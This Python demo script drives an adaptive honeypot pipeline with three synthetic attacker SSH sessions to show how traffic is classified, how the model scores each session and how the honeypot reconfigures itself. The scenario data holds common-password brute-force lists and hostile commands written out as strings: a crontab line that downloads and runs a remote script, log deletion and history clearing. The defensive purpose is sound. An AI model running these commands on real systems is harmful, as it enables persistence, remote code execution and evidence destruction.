"""
demo/simulate_attack.py

Drives the full pipeline with three synthetic attacker sessions -- no network,
no live Cowrie -- so the panel can watch traffic classification, 128-feature
extraction, MT3 inference and honeypot reconfiguration happen step by step.
Results are appended to logs/pipeline_results.jsonl, so the dashboard shows them.
"""
from __future__ import annotations

import argparse
import json
import logging
import random
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from adaptive_honeypot.configurator import configurator  # noqa: E402
from traffic_gateway.ext_paths import ensure_paths  # noqa: E402
from traffic_gateway.post_session_pipeline import (  # noqa: E402
    DEFAULT_RESULTS_PATH, PostSessionPipeline,
)
from traffic_gateway.traffic_classifier import traffic_classifier  # noqa: E402

ensure_paths()
from src.parsers.cowrie_parser import build_record, label_command  # noqa: E402

# ── ANSI colour (disabled with --no-color or on a dumb terminal) ─────────────
class C:
    OFF = False
    @classmethod
    def _w(cls, code: str, s: str) -> str:
        return s if cls.OFF else f"\033[{code}m{s}\033[0m"
    @classmethod
    def cyan(cls, s): return cls._w("96", s)
    @classmethod
    def green(cls, s): return cls._w("92", s)
    @classmethod
    def yellow(cls, s): return cls._w("93", s)
    @classmethod
    def red(cls, s): return cls._w("91", s)
    @classmethod
    def mag(cls, s): return cls._w("95", s)
    @classmethod
    def dim(cls, s): return cls._w("90", s)
    @classmethod
    def bold(cls, s): return cls._w("1", s)


# ── Event timing, calibrated to the real corpus ──────────────────────────────
# Measured over 5,425 closed sessions in data/raw/cowrie_logs/cowrie.json:
#   inter-arrival  min 0.100s  p25 1.54  median 2.92  p75 4.53  max 10.0
#   sessions containing ANY sub-100ms gap: 0 / 5425  (0.00%)
#   time-to-first-command  median 15.8s (p25 9.7, p75 38.9); 0 for brute-only
# The floor matters: the temporal extractor counts a run of IATs < 100ms as a
# "burst", so emitting two events at the same timestamp sets burst_count = 1 --
# a value no training session has, worth about +18 standard deviations after
# scaling, which swamps the LSTM branch and derails the prediction. Keep every
# gap at or above IAT_FLOOR.
IAT_FLOOR = 0.10
IAT_MIN, IAT_MAX = 1.4, 4.6          # matches the measured p25-p75 band
THINK_MIN, THINK_MAX = 9.7, 38.9     # login success -> first command
CLOSE_MIN, CLOSE_MAX = 1.0, 5.0      # last event -> session.closed


def _gap(rng: random.Random, lo: float, hi: float) -> float:
    return max(IAT_FLOOR, rng.uniform(lo, hi))


# ── Scenario definitions ─────────────────────────────────────────────────────
# Each scenario is written as the Cowrie EVENT STREAM an attacker would produce,
# not as a pre-baked feature vector: the demo therefore exercises the same
# parser -> extractor -> MT3 path a live session takes.
SCENARIOS: List[Dict[str, Any]] = [
    {
        "name": "Reconnaissance + Brute Force",
        "expect_states": ["RECON_IP_SCAN", "ACCESS_BRUTE_SSH"],
        "expect_routing": "SSH_HONEYPOT, low interaction",
        "src_ip": "45.129.14.77",
        "src_country": "RU",
        "ja3_hash": "51c64c77e60f3980eea90869b68c58a8",   # Nmap TLS probe
        "ports_scanned": [21, 22, 23, 80, 445, 3389],
        "connections_last_min": 34,
        # 22 failures + 1 success = 26 events over ~66s, matching the real
        # corpus's brute-force sessions (median 27 events / 68.6s). A shorter
        # burst of 7 attempts sits off-distribution and MT3 splits between
        # ACCESS_BRUTE_SSH and EXEC_WGET_EXEC; at realistic volume it is stable.
        "logins": [(u, p, False) for u, p in (
            ("root", "123456"), ("root", "admin"), ("admin", "admin"),
            ("root", "password"), ("root", "toor"), ("oracle", "oracle"),
            ("root", "1234"), ("ubuntu", "ubuntu"), ("test", "test"),
            ("root", "qwerty"), ("pi", "raspberry"), ("admin", "1234"),
            ("root", "123456"), ("root", "admin"), ("admin", "admin"),
            ("root", "password"), ("root", "toor"), ("oracle", "oracle"),
            ("root", "1234"), ("ubuntu", "ubuntu"), ("test", "test"),
            ("root", "qwerty"),
        )] + [("root", "root", True)],
        "commands": [],
        "gap_scale": 1.0,
    },
    {
        "name": "Execution + Discovery",
        "expect_states": ["EXEC_SHELL_OPEN", "DISC_ENV_PROBE", "DISC_NETSTAT_SCAN"],
        "expect_routing": "SSH_HONEYPOT, medium interaction",
        "src_ip": "185.220.101.34",
        "src_country": "DE",
        "ja3_hash": "e7d705a3286e19ea42f587b6a00e55b3",   # python requests
        "ports_scanned": [22],
        "connections_last_min": 3,
        "logins": [("root", "root", True)],
        "commands": ["uname -a", "id", "whoami", "cat /proc/cpuinfo",
                     "netstat -tulpn", "ss -antp", "ip addr show",
                     "ps aux | grep -v grep"],
        "gap_scale": 1.0,
    },
    {
        "name": "Privilege Escalation + Persistence",
        "expect_states": ["PRIVESC_SUDO_ABUSE", "PERSIST_CRONTAB", "EVASION_LOG_WIPE"],
        # Phase 4-6 maps to HIGH interaction; the external alert arms at phase
        # 7-8 (Lateral Movement / Exfiltration) per the Step 4 phase table.
        "expect_routing": "SSH_HONEYPOT, high interaction (alert arms at phase 7-8)",
        "src_ip": "103.75.190.12",
        "src_country": "CN",
        "ja3_hash": "a0e9f5d64349fb13191bc781f81f42e1",   # Metasploit meterpreter
        "ports_scanned": [22],
        "connections_last_min": 2,
        "logins": [("root", "root", True)],
        # Kept to the chain this scenario claims to simulate. The earlier draft
        # also mixed in SUID hunting, wget and key reading, spanning five
        # micro-states; the semantic block then averages toward the generic
        # EXEC_SHELL_OPEN. A coherent privesc -> persist -> evade session lands
        # on phase 6 across every seed.
        "commands": [
            "sudo -l",
            "sudo su -",
            "echo '* * * * * curl -s http://198.51.100.9/b.sh|bash' | crontab -",
            "crontab -l",
            "rm -rf /var/log/auth.log /var/log/syslog",
            "history -c",
        ],
        "gap_scale": 1.0,
    },
]


def _iso(ts: float) -> str:
    return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat().replace("+00:00", "Z")


def build_events(sc: Dict[str, Any], t0: float, rng: random.Random) -> List[dict]:
    """Synthesise the Cowrie event stream for one scenario.

    Every inter-event gap is drawn from the real corpus's measured band, and
    none is allowed below IAT_FLOOR -- see the timing note above.
    """
    sid = f"{rng.getrandbits(48):012x}"
    ip = sc["src_ip"]
    t = t0
    ev: List[dict] = [{
        "eventid": "cowrie.session.connect", "session": sid, "src_ip": ip,
        "src_port": rng.randint(30000, 60000), "dst_port": 22,
        "protocol": "ssh", "timestamp": _iso(t),
    }]
    t += _gap(rng, 0.15, 0.6)
    ev.append({"eventid": "cowrie.client.version", "session": sid, "src_ip": ip,
               "version": "SSH-2.0-libssh2_1.9.0", "timestamp": _iso(t)})

    for user, pw, success in sc["logins"]:
        t += _gap(rng, IAT_MIN, IAT_MAX)
        ev.append({
            "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
            "session": sid, "src_ip": ip, "username": user, "password": pw,
            "timestamp": _iso(t),
        })

    for i, cmd in enumerate(sc["commands"]):
        # Attackers pause after landing a shell before typing the first command.
        t += (_gap(rng, THINK_MIN, THINK_MAX) if i == 0
              else _gap(rng, IAT_MIN, IAT_MAX) * sc.get("gap_scale", 1.0))
        ev.append({"eventid": "cowrie.command.input", "session": sid, "src_ip": ip,
                   "input": cmd, "timestamp": _iso(t)})

    t += _gap(rng, CLOSE_MIN, CLOSE_MAX)
    ev.append({"eventid": "cowrie.session.closed", "session": sid, "src_ip": ip,
               "duration": round(t - t0, 3), "timestamp": _iso(t)})
    return ev


def prime_classifier(sc: Dict[str, Any]) -> None:
    """Feed the gateway's behaviour window so port-scan / flood signals fire."""
    ip = sc["src_ip"]
    for port in sc["ports_scanned"]:
        traffic_classifier.record_connection(ip, port)
    for _ in range(max(0, int(sc["connections_last_min"]) - len(sc["ports_scanned"]))):
        traffic_classifier.record_connection(ip, 22)


def step(n: int, title: str) -> None:
    print(f"\n  {C.cyan(f'[{n}]')} {C.bold(title)}")


def run_scenario(idx: int, sc: Dict[str, Any], pipe: PostSessionPipeline,
                 rng: random.Random, pause: float) -> Dict[str, Any]:
    print("\n" + "=" * 74)
    print(f"  SCENARIO {idx} - {C.bold(sc['name'])}")
    print(f"  simulates : {' -> '.join(sc['expect_states'])}")
    print(f"  expected  : {sc['expect_routing']}")
    print("=" * 74)

    t0 = time.time() - rng.uniform(60, 300)

    # 1. inbound connection, pre-MT3 gateway filter
    step(1, "GATEWAY  pre-filter (traffic_classifier)")
    prime_classifier(sc)
    verdict = traffic_classifier.classify({
        "src_ip": sc["src_ip"], "dst_port": 22, "src_country": sc["src_country"],
        "ja3_hash": sc["ja3_hash"],
        "failed_auth_attempts": sum(1 for _, _, ok in sc["logins"] if not ok),
        "command_text": " ; ".join(sc["commands"]),
    }, record=False)
    col = C.red if verdict["verdict"] == "MALICIOUS" else (
        C.yellow if verdict["verdict"] == "SUSPICIOUS" else C.green)
    print(f"      src_ip     {sc['src_ip']}  ({sc['src_country']})")
    print(f"      score      {verdict['score']:.3f}   verdict {col(verdict['verdict'])}"
          f"   action {col(verdict['action'])}")
    print(f"      signals    {', '.join(verdict['signals_fired']) or '(none)'}")
    d = verdict["details"]
    print(C.dim(f"      detail     conn/min={d.get('connections_per_min')} "
                f"ports/5m={d.get('unique_ports_5min')} "
                f"failed_auth={d.get('failed_auth_attempts')} "
                f"entropy={d.get('entropy_shannon')}"))
    time.sleep(pause)

    # 2. Cowrie captures the session
    step(2, "COWRIE   session capture -> event stream")
    events = build_events(sc, t0, rng)
    kinds: Dict[str, int] = {}
    for e in events:
        kinds[e["eventid"]] = kinds.get(e["eventid"], 0) + 1
    print(f"      session_id {events[0]['session']}   {len(events)} events")
    for k, v in kinds.items():
        print(C.dim(f"        {v:>3}x {k}"))
    time.sleep(pause)

    # 3. parse
    step(3, "PARSER   cowrie_parser.build_record()")
    record = build_record(events)
    record["src_country"] = sc["src_country"]
    record["ja3_hash"] = sc["ja3_hash"]
    print(f"      duration   {record['session_duration_s']:.2f}s   "
          f"logins {record['login_attempts']}   commands {record['n_commands']}")
    print(f"      rule label {record['micro_state']}   "
          f"(regex heuristic, not the model)")
    if record["n_commands"]:
        print(C.dim(f"      commands   " + " ; ".join(
            record["command_text"].split(" ; ")[:3]) + (" ..." if record["n_commands"] > 3 else "")))
    seq = record["micro_state_sequence"].split(",")
    print(C.dim(f"      sequence   {' -> '.join(dict.fromkeys(seq))}"))
    time.sleep(pause)

    # 4-6. features -> MT3 -> configurator, all inside the real pipeline
    step(4, "FEATURES 128-d extraction (6 groups) + MT3 inference + config")
    before = configurator.load_active()
    result = pipe.process_session(record, gateway_verdict=verdict)
    m = result["mt3_prediction"]
    print(f"      groups     A(24) B(28) C(24) D(30) E(14) F(8) = 128 features"
          f"   {'semantic ON' if result['semantic_available'] else C.yellow('semantic OFF')}")
    print(f"      {C.bold('MT3')}        {C.mag(m['micro_state'])}   "
          f"confidence {m['confidence']:.3f}")
    print(f"      phase      {m['phase']} ({m['phase_name']})   "
          f"target {m['honeypot_target']}")
    print(C.dim("      top-3      " + "  ".join(
        f"{t['micro_state']} {t['p']:.3f}" for t in m["top3"])))
    print(C.dim(f"      kcvr_valid {result['kcvr_valid']}   "
                f"latency {result['latency_ms']:.0f}ms"))
    time.sleep(pause)

    step(5, "HONEYPOT adaptive reconfiguration")
    act = result["honeypot_action"]
    new = act["new_config"]
    lvl = new["interaction_level"]
    lc = {"low": C.cyan, "medium": C.yellow, "high": C.red, "maximum": C.red}[lvl]
    print(f"      changed    {C.green('YES') if act['changed'] else C.dim('no')}")
    print(f"      reason     {act['reason']}")
    print(f"      level      {before['interaction_level']} -> {lc(lvl.upper())}")
    print(f"      filesystem {new['filesystem']}   delay {new['response_delay_ms']}ms")
    print(f"      fake creds {new['fake_credentials_visible']}   "
          f"/etc/shadow {new['fake_sensitive_files']}   "
          f"ssh keys {new['fake_ssh_keys']}")
    print(f"      banner     {new['banner']}")
    if new.get("cve_id"):
        print(f"      cve        {C.mag(new['cve_id'])} applied to the banner")
    if new["alert"]:
        print(f"      {C.red('EXTERNAL ALERT ARMED')} - phase {new['phase']} "
              f"({new['phase_name']})")
    time.sleep(pause)

    step(6, "LOGGED   logs/pipeline_results.jsonl -> dashboard")
    print(C.dim(f"      + 1 line  session {result['session_id']}  "
                f"{len(json.dumps(result))} bytes"))
    return result


def main() -> int:
    ap = argparse.ArgumentParser(description="Simulate attacker sessions end to end")
    ap.add_argument("--results", default=str(DEFAULT_RESULTS_PATH))
    ap.add_argument("--scenario", type=int, choices=[1, 2, 3],
                    help="run only one scenario")
    ap.add_argument("--pause", type=float, default=0.35,
                    help="seconds between timeline steps (0 for instant)")
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--reset-config", action="store_true",
                    help="reset the honeypot to low interaction before starting")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    C.OFF = args.no_color or not sys.stdout.isatty()
    logging.basicConfig(level=logging.WARNING,
                        format="%(asctime)s [%(levelname)-7s] %(message)s")
    logging.getLogger("traffic_gateway").propagate = False
    logging.getLogger("traffic_gateway").setLevel(logging.WARNING)

    rng = random.Random(args.seed)
    scenarios = SCENARIOS if args.scenario is None else [SCENARIOS[args.scenario - 1]]

    print("\n" + "=" * 74)
    print("  ADAPTIVE HONEYPOT ML THREAT GATEWAY - PIPELINE DEMONSTRATION")
    print("  Traffic -> Gateway -> Cowrie -> Features -> MT3 -> Config -> Dashboard")
    print("=" * 74)

    if args.reset_config:
        configurator.reset()
        print("  honeypot reset to low interaction")

    print("  loading MT3 + threat intel ...", end="", flush=True)
    t0 = time.time()
    pipe = PostSessionPipeline(results_path=Path(args.results))
    info = pipe.startup()
    print(f" done ({time.time() - t0:.1f}s)")
    print(f"    MT3        {info['mt3']['n_params']:,} params on {info['mt3']['device']}"
          f"   val macro-F1 {float(info['mt3']['best_val_macro_f1']):.4f}")
    print(f"    KEV        {info['kev_count']:,} CVEs")
    print(f"    semantic   {'DistilBERT + PCA' if info['semantic_available'] else 'UNAVAILABLE'}")
    print(f"    results    {info['results_path']}")

    results = []
    for i, sc in enumerate(scenarios, start=(args.scenario or 1)):
        results.append(run_scenario(i, sc, pipe, rng, args.pause))

    # ── summary ──────────────────────────────────────────────────────────
    print("\n" + "=" * 74)
    print("  SUMMARY")
    print("=" * 74)
    print(f"  {'#':<3}{'scenario':<34}{'gw':<7}{'MT3 micro-state':<22}"
          f"{'conf':<7}{'ph':<4}{'interaction':<13}{'alert':<7}config")
    for i, (sc, r) in enumerate(zip(scenarios, results), start=(args.scenario or 1)):
        m = r["mt3_prediction"]
        n = r["honeypot_action"]["new_config"]
        print(f"  {i:<3}{sc['name'][:33]:<34}{r['gateway_score']:<7.3f}"
              f"{m['micro_state']:<22}{m['confidence']:<7.3f}{m['phase']:<4}"
              f"{n['interaction_level']:<13}{('ARMED' if n['alert'] else '-'):<7}"
              f"{'CHANGED' if r['honeypot_action']['changed'] else '-'}")

    cfg = configurator.load_active()
    print(f"\n  final honeypot posture: {C.bold(cfg['interaction_level'].upper())} "
          f"interaction, phase {cfg['phase']} ({cfg['phase_name']}), "
          f"alert {'ARMED' if cfg['alert'] else 'off'}")
    print(f"  config changes logged : {configurator.changes}")
    print(f"  results appended to   : {args.results}")
    print(f"  view them at          : http://localhost:5000/pipeline")
    print(f"  (start the API first  : python -m traffic_gateway.run_pipeline)\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
